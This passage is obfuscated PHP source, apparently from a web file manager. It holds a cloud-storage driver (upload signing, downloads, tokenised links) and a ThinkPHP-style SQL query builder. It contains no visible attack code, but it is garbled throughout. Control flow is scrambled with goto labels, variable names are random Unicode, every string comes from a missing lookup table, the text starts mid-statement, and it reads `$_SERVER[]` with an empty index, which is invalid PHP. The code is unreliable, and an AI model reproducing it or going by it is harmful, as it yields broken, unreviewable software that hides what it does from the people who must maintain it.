goto AΛ; F: } private function uploadPart($f, $c, &$d) { $a󍊡̇ =& $_SERVER[]; $a˭ = array($a󍊡̇[1375], $a󍊡̇[1373] . $c[$a󍊡̇[1374]], $a󍊡̇[1376] . $c[$a󍊡̇[1370]], $a󍊡̇[141] . $c[$a󍊡̇[1371]]); $c = $this->ussRequest($f, $a󍊡̇[226], $d, $a˭); return !$c[$a󍊡̇[1103]] ? $c[$a󍊡̇[1103]] : $c[$a󍊡̇[1105]]; } public function uploadFormData($B؏, $d = 3600) { return $this->uploadPolicy($B؏, $d); } public function multiUploadFormData($F֘Ȼ, $a꽻ߚ = 3600) { $cΐ =& $_SERVER[]; $c㩱٤ = (int) $GLOBALS[$cΐ[7]][$cΐ[78]]; return $this->uploadPolicy($F֘Ȼ, $a꽻ߚ, $c㩱٤); } private function uploadPolicy($A, $C֝ = 3600, $eӦ = 0) { goto A붛; A붛: $Dڒ =& $_SERVER[]; $aԽ΂ = $Dڒ[8] . $this->bucket; $cҥ켫 = gmdate($Dڒ[1312]); goto f; a޿ב: $F = base64_encode(hash_hmac($Dڒ[1347], "\x50\x4f\123\124\46{$aԽ΂}\x26{$cҥ켫}\x26{$a}", md5("{$this->userpass}"), !0)); $D¥ = array($Dڒ[1218] => $a, $Dڒ[1381] => "\x55\x50\x59\x55\116\x20{$this->username}\x3a{$F}", $Dڒ[175] => $this->endpoint . $aԽ΂); return $D¥; goto bΠ; f: $Aԭ = array($Dڒ[1377] => $this->bucket, $Dڒ[1378] => $A, $Dڒ[1379] => time() + $C֝, $Dڒ[1380] => $cҥ켫); if ($eӦ) { $Aԭ[$Dڒ[1292]] = $eӦ; } $a = base64_encode(json_encode($Aԭ)); goto a޿ב; bΠ: } public function download($aҡǶ, $A櫾) { goto C; C: $B߉ = IO::getPathInner(IO::mkfile($A櫾)); if (!($a椎 = $this->link($aҡǶ))) { return !1; } $B񅧷ƽ = 0; goto A궾; A궾: $a = 1024 * 200; $aИ = fopen($B߉, $_SERVER[][1331]); while (!0) { $cٵϡ = $this->fileSubstr($aҡǶ, $B񅧷ƽ, $a); if ($cٵϡ === !1) { return !1; } fwrite($aИ, $cٵϡ); $B񅧷ƽ += $a; if (strlen($cٵϡ) < $a) { break; } } goto b; b: fclose($aИ); return $A櫾; goto Bī; Bī: } public function link($E, $FՊ = array()) { $A흢 =& $_SERVER[]; $E = trim($E, $A흢[8]); if (!empty($this->token)) { $Aޢ = strtotime(date($A흢[1382])); $Fώ = substr(md5($this->token . $A흢[282] . $Aޢ . $A흢[1383] . $E), 12, 8) . $Aޢ; $FՊ[] = $A흢[1384] . $Fώ; } $eحً = !empty($FՊ) ? $A흢[70] . implode($A흢[282], $FՊ) : $A흢[33]; return $this->getHost() . $A흢[8] . $E . $eحً; } public function fileOut($a, $Dю = false, $F˵ = false, $FՆ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($a, $Dю, $F˵, $FՆ); } if (!$F˵) { $F˵ = $this->pathThis($a); } $Aˌ = $Dю ? array($_SERVER[][1385] . rawurlencode($F˵)) : array(); $c = $this->link($a, $Aˌ); $this->fileOutLink($c); } public function fileOutServer($cɋ, $b͟ = false, $cۓ = false, $E = '') { parent::fileOut($cɋ, $b͟, $cۓ, $E); } public function fileOutImage($D, $Fߤ = 250) { $A = $this->link($D . $_SERVER[][1386] . $Fߤ); $this->fileOutLink($A); } public function fileOutImageServer($A܏, $cら = 250) { parent::fileOutImage($A܏, $cら); } public function hashMd5($Bъ) { $eȝ =& $_SERVER[]; $dۜ = $this->_objectMeta($Bъ); return isset($dۜ[$eȝ[208]]) ? $dۜ[$eȝ[208]] : !1; } public function size($A) { $a = $this->objectMeta($A); return $a ? $a[$_SERVER[][78]] : 0; } public function info($A) { if ($this->isFolder($A)) { return $this->folderInfo($A); } else { if ($this->isFile($A)) { return $this->fileInfo($A); } } return !1; } public function exist($B) { return $this->isFile($B) || $this->isFolder($B); } public function isFile($AÕ) { return !$this->isFolder($AÕ) && $this->objectMeta($AÕ); } public function isFolder($FѰ) { return $this->cacheMethod($_SERVER[][199], $FѰ); } protected function objectMeta($C) { return $this->cacheMethod($_SERVER[][200], $C); } protected function _objectMeta($dǋ) { goto bԐ; b: if (!$Eܡ[$ěڨ[1103]]) { return null; } $dݏ = isset($Eܡ[$ěڨ[1105]]) ? $Eܡ[$ěڨ[1105]] : array(); if (!isset($dݏ[$ěڨ[1388]])) { return null; } goto A; A: $b = array($ěڨ[29] => isset($dݏ[$ěڨ[1388]]) ? $dݏ[$ěڨ[1388]] : null, $ěڨ[78] => isset($dݏ[$ěڨ[1389]]) ? $dݏ[$ěڨ[1389]] : null, $ěڨ[208] => isset($dݏ[$ěڨ[1390]]) ? $dݏ[$ěڨ[1390]] : null, $ěڨ[1357] => isset($dݏ[$ěڨ[1391]]) ? $dݏ[$ěڨ[1391]] : null); $b[$ěڨ[1358]] = isset($dݏ[$ěڨ[1392]]) ? strtotime($dݏ[$ěڨ[1392]]) : $b[$ěڨ[1357]]; return $b; goto D; bԐ: $ěڨ =& $_SERVER[]; if ($dǋ == $ěڨ[33] || $dǋ == $ěڨ[8]) { return array(); } $Eܡ = $this->ussRequest($dǋ, $ěڨ[1387]); goto b; D: } protected function _isFolder($c͑) { $a؃ =& $_SERVER[]; if ($c͑ == $a؃[33] || $c͑ == $a؃[8]) { return !0; } $dȴ = $this->_objectMeta($c͑); return isset($dȴ[$a؃[29]]) && $dȴ[$a؃[29]] == $a؃[77] ? !0 : !1; } } goto a; Fƿ皅: class DbSqlite3 extends DbSqlite3Base { public function query($Eٿ) { $fձ =& $_SERVER[]; if (!CacheLock::fileLock($fձ[9])) { return !1; } $a♲ = parent::query($Eٿ); CacheLock::fileUnLock($fձ[9]); return $a♲; } public function execute($Cʹ) { $Bﹲ =& $_SERVER[]; if (!CacheLock::fileLock($Bﹲ[9])) { return !1; } $bݟɅ = parent::execute($Cʹ); CacheLock::fileUnLock($Bﹲ[9]); return $bݟɅ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\161" => "\74\76", "\x67\x74" => "\x3e", "\145\x67\164" => "\76\75", "\x6c\x74" => "\x3c", "\145\154\164" => "\74\x3d", "\x6e\157\164\154\151\x6b\x65" => "\x4e\117\x54\40\114\111\x4b\x45", "\x6c\151\x6b\145" => "\x4c\x49\x4b\105", "\x69\x6e" => "\111\116", "\x6e\157\x74\x69\156" => "\x4e\x4f\x54\x20\x49\x4e", "\x6e\157\x74\40\x69\156" => "\x4e\117\x54\40\x49\116", "\142\x65\164\x77\x65\x65\x6e" => "\102\105\x54\x57\x45\105\116", "\x6e\157\164\x62\145\x74\x77\145\x65\x6e" => "\116\117\x54\40\x42\x45\124\x57\105\x45\x4e", "\156\157\164\x20\x62\x65\164\x77\x65\x65\156" => "\116\117\124\x20\102\x45\x54\127\x45\105\116"); protected $selectSql = "\x53\x45\x4c\105\103\124\x25\104\111\123\124\111\116\103\124\45\40\x25\106\x49\x45\114\x44\45\x20\106\122\117\x4d\x20\45\x54\x41\102\x4c\105\x25\x25\112\117\111\x4e\x25\x25\x57\x48\105\x52\x45\45\x25\107\x52\x4f\125\x50\x25\x25\110\101\x56\x49\x4e\x47\x25\x25\117\x52\104\105\x52\x25\x25\114\x49\115\111\124\45\40\x25\125\116\111\x4f\x4e\x25\45\103\x4f\115\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $D΢ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][938], $D΢); } public function factory($c޸߳ = '') { goto C˺ʃ; C˺ʃ: $eڈ =& $_SERVER[]; $c޸߳ = $this->parseConfig($c޸߳); if (empty($c޸߳[$eڈ[939]])) { think_exception(think_lang($eڈ[940])); } goto b珙; F: return $Dנ; goto cƒ; b珙: $this->dbType = ucwords(strtolower($c޸߳[$eڈ[939]])); $cьʋ = $eڈ[941] . $this->dbType; if (class_exists($cьʋ)) { $Dנ = new $cьʋ($c޸߳); if ($eڈ[774] != strtolower($c޸߳[$eڈ[939]])) { $Dנ->dbType = strtoupper($this->dbType); } else { $Dנ->dbType = $this->_getDsnType($c޸߳[$eڈ[894]]); } } else { think_exception(think_lang($eڈ[942]) . $eڈ[943] . $cьʋ); } goto F; cƒ: } public function __call($C泿ފ, $B붾) { if (method_exists($this, $C泿ފ)) { return call_user_func_array(array($this, $C泿ފ), $B붾); } } protected function _getDsnType($F₋) { $Fݑ˞ = explode($_SERVER[][4], $F₋); $a = strtoupper(trim($Fݑ˞[0])); return $a; } private function parseConfig($Dʇ = '') { $C =& $_SERVER[]; if (!empty($Dʇ) && is_string($Dʇ)) { $Dʇ = $this->parseDSN($Dʇ); } elseif (is_array($Dʇ)) { $Dʇ = array_change_key_case($Dʇ); $Dʇ = array($C[939] => $Dʇ[$C[773]], $C[867] => $Dʇ[$C[944]], $C[868] => $Dʇ[$C[945]], $C[865] => $Dʇ[$C[946]], $C[866] => $Dʇ[$C[947]], $C[17] => $Dʇ[$C[948]], $C[894] => $Dʇ[$C[775]], $C[13] => isset($Dʇ[$C[949]]) ? $Dʇ[$C[949]] : array()); } elseif (empty($Dʇ)) { if (think_config($C[950]) && $C[774] != strtolower(think_config($C[951]))) { $Dʇ = $this->parseDSN(think_config($C[950])); } else { $Dʇ = array($C[939] => think_config($C[951]), $C[867] => think_config($C[952]), $C[868] => think_config($C[953]), $C[865] => think_config($C[954]), $C[866] => think_config($C[955]), $C[17] => think_config($C[244]), $C[894] => think_config($C[950]), $C[13] => think_config($C[956])); } } return $Dʇ; } protected function initConnect($bŋ = true) { if (1 == think_config($_SERVER[][18])) { $this->_linkID = $this->multiConnect($bŋ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $dͅ => $AЧ) { $this->_linkID = $AЧ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($C֐͠ = false) { goto d; Bԃ: $B؈ = array($e[867] => isset($C[$e[867]][$b鷯]) ? $C[$e[867]][$b鷯] : $C[$e[867]][0], $e[868] => isset($C[$e[868]][$b鷯]) ? $C[$e[868]][$b鷯] : $C[$e[868]][0], $e[865] => isset($C[$e[865]][$b鷯]) ? $C[$e[865]][$b鷯] : $C[$e[865]][0], $e[866] => isset($C[$e[866]][$b鷯]) ? $C[$e[866]][$b鷯] : $C[$e[866]][0], $e[17] => isset($C[$e[17]][$b鷯]) ? $C[$e[17]][$b鷯] : $C[$e[17]][0], $e[894] => isset($C[$e[894]][$b鷯]) ? $C[$e[894]][$b鷯] : $C[$e[894]][0], $e[13] => isset($C[$e[13]][$b鷯]) ? $C[$e[13]][$b鷯] : $C[$e[13]][0]); return $this->connect($B؈, $b鷯); goto e; d: $e =& $_SERVER[]; static $C = array(); static $bٟ = -1; goto Bݱ; Bݱ: if (empty($C)) { foreach ($this->config as $A֕Ώ => $B쓼޶) { $C[$A֕Ώ] = explode($e[47], $B쓼޶); } } if (think_config($e[957])) { if ($C֐͠ || think_config($e[391]) === !0) { $b鷯 = floor(mt_rand(0, think_config($e[958]) - 1)); $bٟ = $b鷯; } else { if (is_numeric(think_config($e[959]))) { $b鷯 = think_config($e[959]); } else { $b鷯 = floor(mt_rand(think_config($e[958]), count($C[$e[865]]) - 1)); } } } else { $b鷯 = floor(mt_rand(0, count($C[$e[865]]) - 1)); $bٟ = $b鷯; } $b鷯 = $bٟ !== -1 ? $bٟ : $b鷯; goto Bԃ; e: } public function parseDSN($B嫇) { $eݟ =& $_SERVER[]; if (empty($B嫇)) { return !1; } $eʉ = parse_url($B嫇); if ($eʉ[$eݟ[174]]) { $Bڠ = array($eݟ[939] => $eʉ[$eݟ[174]], $eݟ[867] => isset($eʉ[$eݟ[588]]) ? $eʉ[$eݟ[588]] : $eݟ[33], $eݟ[868] => isset($eʉ[$eݟ[960]]) ? $eʉ[$eݟ[960]] : $eݟ[33], $eݟ[865] => isset($eʉ[$eݟ[175]]) ? $eʉ[$eݟ[175]] : $eݟ[33], $eݟ[866] => isset($eʉ[$eݟ[176]]) ? $eʉ[$eݟ[176]] : $eݟ[33], $eݟ[17] => isset($eʉ[$eݟ[76]]) ? substr($eʉ[$eݟ[76]], 1) : $eݟ[33]); } else { preg_match($eݟ[961], trim($B嫇), $cơΆ); $Bڠ = array($eݟ[939] => $cơΆ[1], $eݟ[867] => $cơΆ[2], $eݟ[868] => $cơΆ[3], $eݟ[865] => $cơΆ[4], $eݟ[866] => $cơΆ[5], $eݟ[17] => $cơΆ[6]); } $Bڠ[$eݟ[894]] = $eݟ[33]; return $Bڠ; } protected function debug() { $Fۄȳ =& $_SERVER[]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Fۄȳ[962]; if (think_config($Fۄȳ[963])) { think_status($Fۄȳ[964]); think_trace($this->queryStr . $Fۄȳ[965] . think_status($Fۄȳ[20], $Fۄȳ[964], 6) . $Fۄȳ[966], $Fۄȳ[33], $Fۄȳ[967]); } } protected function parseLock($D = false) { $e =& $_SERVER[]; if (!$D) { return $e[33]; } if ($e[896] == $this->dbType) { return $e[968]; } return $e[969]; } protected function parseSet($cѣϨ) { $B =& $_SERVER[]; foreach ($cѣϨ as $eօ؅ => $CΜ) { if (is_array($CΜ) && $B[295] == $CΜ[0]) { $aඬ[] = $this->parseKey($eօ؅) . $B[970] . $CΜ[1]; } elseif (is_scalar($CΜ) || is_null($CΜ)) { $aඬ[] = $this->parseKey($eօ؅) . $B[970] . $this->parseValue($CΜ); } } return $B[971] . implode($B[47], $aඬ); } protected function bindParam($A, $aˉ㛆) { $this->bind[$_SERVER[][4] . $A] = $aˉ㛆; } protected function parseBind($aß) { $aß = array_merge($this->bind, $aß); $this->bind = array(); return $aß; } function parseKey(&$c, $B҆Å = true) { if ($B҆Å) { $c = $this->parseKeyCheck($c); } return $c; } function parseKeyCheck($c) { $a =& $_SERVER[]; $c = trim($c); if (!preg_match($a[972], $c)) { think_exception($a[973] . $c); } return $c; } protected function parseValue($Dܐ) { $aٜ =& $_SERVER[]; if (is_string($Dܐ)) { $Dܐ = $aٜ[935] . $this->escapeString($Dܐ) . $aٜ[935]; } elseif (isset($Dܐ[0]) && is_string($Dܐ[0]) && strtolower($Dܐ[0]) == $aٜ[295]) { $Dܐ = $this->escapeString($Dܐ[1]); } elseif (is_array($Dܐ)) { $Dܐ = array_map(array($this, $aٜ[936]), $Dܐ); } elseif (is_bool($Dܐ)) { $Dܐ = $Dܐ ? $aٜ[87] : $aٜ[191]; } elseif (is_null($Dܐ)) { $Dܐ = $aٜ[103]; } return $Dܐ; } protected function parseField($F驂) { $eΚ =& $_SERVER[]; if (is_string($F驂) && strpos($F驂, $eΚ[47])) { $F驂 = explode($eΚ[47], $F驂); } if (is_array($F驂)) { $B = array(); foreach ($F驂 as $eΓّ => $a) { if (!is_numeric($eΓّ)) { $B[] = $this->parseKey($eΓّ, !1) . $eΚ[974] . $this->parseKey($a); } else { $B[] = $this->parseKey($a); } } $a = implode($eΚ[47], $B); } elseif (is_string($F驂) && !empty($F驂)) { $a = $F驂; } else { $a = $eΚ[182]; } return $a; } protected function parseTable($a՚ݞ) { $b =& $_SERVER[]; if (is_array($a՚ݞ)) { $c̎ = array(); foreach ($a՚ݞ as $C񰿾 => $AϾ) { if (!is_numeric($C񰿾)) { $c̎[] = $this->parseKey($C񰿾) . $b[50] . $this->parseKey($AϾ); } else { $c̎[] = $this->parseKey($C񰿾); } } $a՚ݞ = $c̎; } elseif (is_string($a՚ݞ)) { if (strstr($a՚ݞ, $b[50])) { return $a՚ݞ; } $a՚ݞ = explode($b[47], $a՚ݞ); array_walk($a՚ݞ, array($this, $b[885])); } return $b[879] . trim(implode($b[975], $a՚ݞ), $b[383]) . $b[879]; } protected function parseWhere($e܌) { $Cם׉ =& $_SERVER[]; $cٰ = $Cם׉[33]; if (is_string($e܌)) { $cٰ = $e܌; } else { $B֙ = isset($e܌[$Cם׉[976]]) ? strtoupper($e܌[$Cם׉[976]]) : $Cם׉[33]; if (in_array($B֙, array($Cם׉[977], $Cם׉[978], $Cם׉[979]))) { $B֙ = $Cם׉[50] . $B֙ . $Cם׉[50]; unset($e܌[$Cם׉[976]]); } else { $B֙ = $Cם׉[980]; } foreach ($e܌ as $DŽ => $a돶) { $cٰ .= $Cם׉[275]; if (is_numeric($DŽ)) { $DŽ = $Cם׉[981]; } if (0 === strpos($DŽ, $Cם׉[71])) { $cٰ .= $this->parseThinkWhere($DŽ, $a돶); } else { if (!preg_match($Cם׉[982], trim($DŽ))) { think_exception(think_lang($Cם׉[983]) . $Cם׉[4] . $DŽ); } $Fꭸ = is_array($a돶) && isset($a돶[$Cם׉[984]]); $DŽ = trim($DŽ); if (strpos($DŽ, $Cם׉[281])) { $aǤ = explode($Cם׉[281], $DŽ); $a֒ = array(); foreach ($aǤ as $Fӌ => $aɣǰ) { $fʲ = $Fꭸ ? $a돶[$Fӌ] : $a돶; $a֒[] = $Cם׉[258] . $this->parseWhereItem($this->parseKey($aɣǰ), $fʲ) . $Cם׉[884]; } $cٰ .= implode($Cם׉[985], $a֒); } elseif (strpos($DŽ, $Cם׉[282])) { $aǤ = explode($Cם׉[282], $DŽ); $a֒ = array(); foreach ($aǤ as $Fӌ => $aɣǰ) { $fʲ = $Fꭸ ? $a돶[$Fӌ] : $a돶; $a֒[] = $Cם׉[258] . $this->parseWhereItem($this->parseKey($aɣǰ), $fʲ) . $Cם׉[884]; } $cٰ .= implode($Cם׉[980], $a֒); } else { $cٰ .= $this->parseWhereItem($this->parseKey($DŽ), $a돶); } } $cٰ .= $Cם׉[276] . $B֙; } $cٰ = substr($cٰ, 0, -strlen($B֙)); } return empty($cٰ) ? $Cם׉[33] : $Cם׉[986] . $cٰ; } protected function parseWhereItem($a֊, $AѰ뎉) { $Aȍ =& $_SERVER[]; $cą = $Aȍ[33]; if (is_array($AѰ뎉)) { if (is_string($AѰ뎉[0])) { $dͭ = strtolower($AѰ뎉[0]); if (in_array($AѰ뎉[0], array($Aȍ[970], $Aȍ[987], $Aȍ[988], $Aȍ[989], $Aȍ[990], $Aȍ[991]))) { $cą .= $a֊ . $Aȍ[50] . $AѰ뎉[0] . $Aȍ[50] . $this->parseValue($AѰ뎉[1]); } elseif (preg_match($Aȍ[992], $AѰ뎉[0])) { $cą .= $a֊ . $Aȍ[50] . $this->exp[$dͭ] . $Aȍ[50] . $this->parseValue($AѰ뎉[1]); } elseif (preg_match($Aȍ[993], $AѰ뎉[0])) { if (is_array($AѰ뎉[1])) { $e = isset($AѰ뎉[2]) ? strtoupper($AѰ뎉[2]) : $Aȍ[978]; if (in_array($e, array($Aȍ[977], $Aȍ[978], $Aȍ[979]))) { $d = array(); foreach ($AѰ뎉[1] as $Bđ) { $d[] = $a֊ . $Aȍ[50] . $this->exp[$dͭ] . $Aȍ[50] . $this->parseValue($Bđ); } $cą .= $Aȍ[258] . implode($Aȍ[50] . $e . $Aȍ[50], $d) . $Aȍ[884]; } } else { $cą .= $a֊ . $Aȍ[50] . $this->exp[$dͭ] . $Aȍ[50] . $this->parseValue($AѰ뎉[1]); } } elseif ($Aȍ[295] == $dͭ) { $cą .= $Aȍ[882] . $a֊ . $Aȍ[50] . $AѰ뎉[1] . $Aȍ[994]; } elseif (preg_match($Aȍ[995], $AѰ뎉[0])) { $cą .= $AѰ뎉[0]; } elseif (preg_match($Aȍ[996], $AѰ뎉[0])) { if (isset($AѰ뎉[2]) && $Aȍ[295] == $AѰ뎉[2]) { $cą .= $a֊ . $Aȍ[50] . $this->exp[$dͭ] . $Aȍ[50] . $AѰ뎉[1]; } else { if (is_string($AѰ뎉[1])) { $AѰ뎉[1] = explode($Aȍ[47], $AѰ뎉[1]); } $dޣ = implode($Aȍ[47], $this->parseValue($AѰ뎉[1])); $cą .= $a֊ . $Aȍ[50] . $this->exp[$dͭ] . $Aȍ[882] . $dޣ . $Aȍ[884]; } } elseif (preg_match($Aȍ[997], $AѰ뎉[0])) { $Bݥݣ = is_string($AѰ뎉[1]) ? explode($Aȍ[47], $AѰ뎉[1]) : $AѰ뎉[1]; $cą .= $Aȍ[882] . $a֊ . $Aȍ[50] . $this->exp[$dͭ] . $Aȍ[50] . $this->parseValue($Bݥݣ[0]) . $Aȍ[980] . $this->parseValue($Bݥݣ[1]) . $Aȍ[276]; } else { think_exception(think_lang($Aȍ[983]) . $Aȍ[4] . $AѰ뎉[0]); } } else { $e = count($AѰ뎉); $a = $Aȍ[33]; if (is_string($AѰ뎉[$e - 1])) { $a = isset($AѰ뎉[$e - 1]) ? strtoupper($AѰ뎉[$e - 1]) : $Aȍ[33]; if (in_array($a, array($Aȍ[977], $Aȍ[978], $Aȍ[979]))) { $e = $e - 1; } } else { $a = $Aȍ[977]; } for ($A = 0; $A < $e; $A++) { $Bݥݣ = is_array($AѰ뎉[$A]) ? $AѰ뎉[$A][1] : $AѰ뎉[$A]; if ($Aȍ[295] == strtolower($AѰ뎉[$A][0])) { $cą .= $Aȍ[258] . $a֊ . $Aȍ[50] . $Bݥݣ . $Aȍ[994] . $a . $Aȍ[50]; } else { $a = is_array($AѰ뎉[$A]) ? $this->exp[strtolower($AѰ뎉[$A][0])] : $Aȍ[970]; if (!$a && is_array($AѰ뎉[$A]) && in_array($AѰ뎉[$A][0], array($Aȍ[970], $Aȍ[987], $Aȍ[988], $Aȍ[989], $Aȍ[990], $Aȍ[991]))) { $a = $AѰ뎉[$A][0]; } $cą .= $Aȍ[258] . $a֊ . $Aȍ[50] . $a . $Aȍ[50] . $this->parseValue($Bݥݣ) . $Aȍ[994] . $a . $Aȍ[50]; } } $cą = substr($cą, 0, -4); } } else { $cą .= $a֊ . $Aȍ[998] . $this->parseValue($AѰ뎉); } return $cą; } protected function parseThinkWhere($eӚ, $A͇я) { $Fҕ =& $_SERVER[]; $b = $Fҕ[33]; switch ($eӚ) { case $Fҕ[350]: $b = $A͇я; break; case $Fҕ[981]: $b = is_string($A͇я) ? $A͇я : substr($this->parseWhere($A͇я), 6); break; case $Fҕ[999]: parse_str($A͇я, $E֣҃); if (isset($E֣҃[$Fҕ[976]])) { $c = $Fҕ[50] . strtoupper($E֣҃[$Fҕ[976]]) . $Fҕ[50]; unset($E֣҃[$Fҕ[976]]); } else { $c = $Fҕ[980]; } $eԍ = array(); foreach ($E֣҃ as $D => $d) { $eԍ[] = $this->parseKey($D) . $Fҕ[998] . $this->parseValue($d); } $b = implode($c, $eԍ); break; } return $b; } protected function parseLimit($bچ) { $aՌ =& $_SERVER[]; return !empty($bچ) ? $aՌ[48] . $bچ . $aՌ[50] : $aՌ[33]; } protected function parseJoin($e淨) { $C񨶶 =& $_SERVER[]; $C = $C񨶶[33]; if (!empty($e淨)) { if (is_array($e淨)) { foreach ($e淨 as $cш => $F㚴) { if (!1 !== stripos($F㚴, $C񨶶[1000])) { $C .= $C񨶶[50] . $F㚴; } else { $C .= $C񨶶[1001] . $F㚴; } } } else { $C .= $C񨶶[1001] . $e淨; } } $C = preg_replace($C񨶶[1002], think_config($C񨶶[908]) . $C񨶶[1003], $C); return $C; } protected function parseOrder($fގ) { $d =& $_SERVER[]; if (is_array($fގ)) { $EɟԽ = array(); foreach ($fގ as $E => $B) { if (is_numeric($E)) { $EɟԽ[] = $this->parseKey($B); } else { $B = in_array(strtoupper(trim($B)), array($d[1004], $d[1005])) ? $d[50] . $B : $d[33]; if (preg_match($d[1006], $E)) { $EɟԽ[] = $this->parseKey($E) . $B; } else { think_exception($d[1007] . $E); } } } $fގ = implode($d[47], $EɟԽ); } return !empty($fގ) ? $d[1008] . $fގ : $d[33]; } protected function parseGroup($f͛) { $fЉۖՎ =& $_SERVER[]; return !empty($f͛) ? $fЉۖՎ[1009] . $f͛ : $fЉۖՎ[33]; } protected function parseHaving($C) { $fŹ =& $_SERVER[]; return !empty($C) ? $fŹ[1010] . $C : $fŹ[33]; } protected function parseComment($Dō) { $Eލ =& $_SERVER[]; return !empty($Dō) ? $Eލ[1011] . $Dō . $Eލ[1012] : $Eލ[33]; } protected function parseDistinct($DӅ) { $e =& $_SERVER[]; return !empty($DӅ) ? $e[1013] : $e[33]; } protected function parseUnion($C) { $C =& $_SERVER[]; if (empty($C)) { return $C[33]; } if (isset($C[$C[346]])) { $bգ = $C[1014]; unset($C[$C[346]]); } else { $bգ = $C[1015]; } foreach ($C as $E޷) { $e껠[] = $bգ . (is_array($E޷) ? $this->buildSelectSql($E޷) : $E޷); } return implode($C[50], $e껠); } public function insert($E֬, $c = array(), $Eϗ = false) { goto c; e: foreach ($E֬ as $D => $Eϔ짺) { if (is_array($Eϔ짺) && $b詶[295] == $Eϔ짺[0]) { $C⑤ʳ[] = $this->parseKey($D); $C[] = $Eϔ짺[1]; } elseif (is_scalar($Eϔ짺) || is_null($Eϔ짺)) { $C⑤ʳ[] = $this->parseKey($D); $C[] = $this->parseValue($Eϔ짺); } } $f = ($Eϗ ? $b詶[886] : $b詶[887]) . $b詶[888] . $this->parseTable($c[$b詶[277]]) . $b詶[882] . implode($b詶[47], $C⑤ʳ) . $b詶[883] . implode($b詶[47], $C) . $b詶[884]; $f .= $this->parseLock(isset($c[$b詶[831]]) ? $c[$b詶[831]] : !1); goto c£ɉ; c: $b詶 =& $_SERVER[]; $C = $C⑤ʳ = array(); $this->model = $c[$b詶[279]]; goto e; c£ɉ: $f .= $this->parseComment(!empty($c[$b詶[352]]) ? $c[$b詶[352]] : $b詶[33]); return $this->execute($f, $this->parseBind(!empty($c[$b詶[283]]) ? $c[$b詶[283]] : array())); goto cƸ; cƸ: } public function selectInsert($C揕, $Bц, $e䛥ֶ = array()) { goto fا; fا: $c =& $_SERVER[]; $this->model = $e䛥ֶ[$c[279]]; if (is_string($C揕)) { $C揕 = explode($c[47], $C揕); } goto F䦉; bȐ: return $this->execute($e, $this->parseBind(!empty($e䛥ֶ[$c[283]]) ? $e䛥ֶ[$c[283]] : array())); goto eܫʵ; F䦉: array_walk($C揕, array($this, $c[885])); $e = $c[1016] . $this->parseTable($Bц) . $c[882] . implode($c[47], $C揕) . $c[994]; $e .= $this->buildSelectSql($e䛥ֶ); goto bȐ; eܫʵ: } public function update($bא׮, $f) { $FН =& $_SERVER[]; $this->model = $f[$FН[279]]; $Aт = $FН[1017] . $this->parseTable($f[$FН[277]]) . $this->parseSet($bא׮) . $this->parseWhere(!empty($f[$FН[273]]) ? $f[$FН[273]] : $FН[33]) . $this->parseOrder(!empty($f[$FН[363]]) ? $f[$FН[363]] : $FН[33]) . $this->parseLimit(!empty($f[$FН[290]]) ? $f[$FН[290]] : $FН[33]) . $this->parseLock(isset($f[$FН[831]]) ? $f[$FН[831]] : !1) . $this->parseComment(!empty($f[$FН[352]]) ? $f[$FН[352]] : $FН[33]); return $this->execute($Aт, $this->parseBind(!empty($f[$FН[283]]) ? $f[$FН[283]] : array())); } public function delete($b = array()) { $b =& $_SERVER[]; $this->model = $b[$b[279]]; $E٦ = $b[1018] . $this->parseTable($b[$b[277]]) . $this->parseWhere(!empty($b[$b[273]]) ? $b[$b[273]] : $b[33]) . $this->parseOrder(!empty($b[$b[363]]) ? $b[$b[363]] : $b[33]) . $this->parseLimit(!empty($b[$b[290]]) ? $b[$b[290]] : $b[33]) . $this->parseLock(isset($b[$b[831]]) ? $b[$b[831]] : !1) . $this->parseComment(!empty($b[$b[352]]) ? $b[$b[352]] : $b[33]); return $this->execute($E٦, $this->parseBind(!empty($b[$b[283]]) ? $b[$b[283]] : array())); } public function select($d탆޹ = array()) { goto Fϯ; Fϯ: $E߃ =& $_SERVER[]; $this->model = $d탆޹[$E߃[279]]; $bϿ = $this->buildSelectSql($d탆޹); goto aģک; f: if ($Bյ && !1 !== $E) { think_cache($aѷ, $E, $Bյ); } return $E; goto aσ݌; aģک: $Bյ = isset($d탆޹[$E߃[347]]) ? $d탆޹[$E߃[347]] : !1; if ($Bյ) { $aѷ = is_string($Bյ[$E߃[93]]) ? $Bյ[$E߃[93]] : $E߃[1019] . md5($bϿ); $bɇ = think_cache($aѷ, $E߃[33], $Bյ); if (!1 !== $bɇ) { return $bɇ; } } $E = $this->query($bϿ, $this->parseBind(!empty($d탆޹[$E߃[283]]) ? $d탆޹[$E߃[283]] : array())); goto f; aσ݌: } public function buildSelectSql($aμ = array()) { goto F鰶; c坷: return $BƜ; goto B; f: $BƜ = $this->parseSql($this->selectSql, $aμ); $BƜ .= $this->parseLock(isset($aμ[$C[831]]) ? $aμ[$C[831]] : !1); if (isset($d򂛈)) { think_cache($d򂛈, $BƜ); } goto c坷; F鰶: $C =& $_SERVER[]; if (isset($aμ[$C[351]])) { if (strpos($aμ[$C[351]], $C[47])) { list($B, $d϶) = explode($C[47], $aμ[$C[351]]); } else { $B = $aμ[$C[351]]; } $B = $B ? $B : 1; $d϶ = isset($d϶) ? $d϶ : (is_numeric($aμ[$C[290]]) ? $aμ[$C[290]] : 20); $DԤ = $d϶ * ((int) $B - 1); $aμ[$C[290]] = $DԤ . $C[47] . $d϶; } if (think_config($C[1020])) { $d򂛈 = $C[1021] . md5(serialize($aμ)); $B = think_cache($d򂛈); if ($B) { return $B; } } goto f; B: } public function parseSql($d, $Aͣ = array()) { $fڽߊ =& $_SERVER[]; $d = str_replace(array($fڽߊ[1022], $fڽߊ[1023], $fڽߊ[1024], 